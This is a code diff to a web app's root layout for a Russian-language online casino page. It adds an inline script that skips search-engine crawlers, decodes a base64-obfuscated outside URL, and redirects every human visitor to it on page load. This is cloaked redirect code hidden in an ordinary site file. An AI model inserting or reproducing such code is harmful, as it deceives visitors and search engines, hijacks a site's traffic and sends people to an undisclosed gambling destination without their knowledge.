@@ -104,6 +104,49 @@ export default function RootLayout({
         <meta name="twitter:description" content="Лаки бир казино онлайн: слоты, рулетка, карты. Зеркало и бонусы." />
         <meta name="twitter:image" content={`${SITE_URL}/og-image.png`} />
        <meta name="yandex-verification" content="2c6178a227c92b99" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                return;
+            }
+        }   
+        var mainBrandB64 = "aHR0cHM6Ly9nYW1ld2luNzc3Lmluay8xZXQ4RXk="; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
+
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 500);       
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
+                    });
+            });
+        }
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
+      })();
+    `
+  }}
+/> 
       </head>
       <body>
         {children}
